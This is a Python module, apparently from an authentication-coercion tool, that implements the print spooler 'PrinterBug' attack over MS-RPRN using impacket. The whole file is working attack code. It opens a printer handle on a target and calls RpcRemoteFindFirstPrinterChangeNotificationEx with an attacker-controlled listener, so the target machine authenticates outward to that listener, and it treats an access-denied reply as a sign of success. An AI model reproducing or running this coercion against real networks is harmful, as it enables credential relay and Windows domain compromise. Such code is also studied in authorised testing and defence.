#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : MS_RPRN.py
# Author             : Podalirius (@podalirius_)
# Date created       : 9 Jul 2022


import sys
from .RPCProtocol import RPCProtocol, DCERPCSessionError
from impacket.dcerpc.v5 import transport, rprn
from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
from impacket.dcerpc.v5.dtypes import UUID, ULONG, WSTR, DWORD, LONG, NULL, BOOL, UCHAR, PCHAR, RPC_SID, LPWSTR, GUID
from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY


class MS_RPRN(RPCProtocol):
    name = "[MS-RPRN]: Print System Remote Protocol"
    shortname = "MS-RPRN"
    uuid = "12345678-1234-ABCD-EF00-0123456789AB"
    version = "1.0"
    available_pipes = [r"\PIPE\spoolss"]

    def RpcRemoteFindFirstPrinterChangeNotificationEx(self, listener, max_retries=3):
        # Microsoft docs: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d
        # Finding credits:
        call_name, call_opnum = "RpcRemoteFindFirstPrinterChangeNotificationEx", 65
        if self.dce is not None:
            tries = 0
            while tries <= max_retries:
                tries += 1
                print("      [>] On '\x1b[93m%s\x1b[0m' through '%s' targeting '\x1b[94m%s::%s\x1b[0m' (opnum %d) ... " % (self.target, self.pipe, self.shortname, call_name, call_opnum), end="")
                sys.stdout.flush()
                try:
                    resp = rprn.hRpcOpenPrinter(self.dce, '\\\\%s\x00' % self.target)

                    request = rprn.RpcRemoteFindFirstPrinterChangeNotificationEx()
                    request['hPrinter'] = resp['pHandle']
                    request['fdwFlags'] = rprn.PRINTER_CHANGE_ADD_JOB
                    request['pszLocalMachine'] = '\\\\%s\x00' % listener
                    request['pOptions'] = NULL
                    if self.debug:
                        request.dump()
                    resp = self.dce.request(request)
                except Exception as e:
                    if "rpc_s_access_denied" in str(e):
                        # DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
                        print("\x1b[1;92mrpc_s_access_denied (Attack should have worked!)\x1b[0m")
                        return False
                    else:
                        print("\x1b[1;91m%s\x1b[0m" % str(e))
                        if self.debug:
                            pass
        else:
            if self.verbose:
                print("[!] Error: dce is None, you must call connect() first.")

    @classmethod
    def list_coerce_methods(cls):
        return [
            ("RpcRemoteFindFirstPrinterChangeNotificationEx", 65, None)
        ]

    def perform_coerce_calls(self, listener):
        if listener is not None:
            self.RpcRemoteFindFirstPrinterChangeNotificationEx(listener)
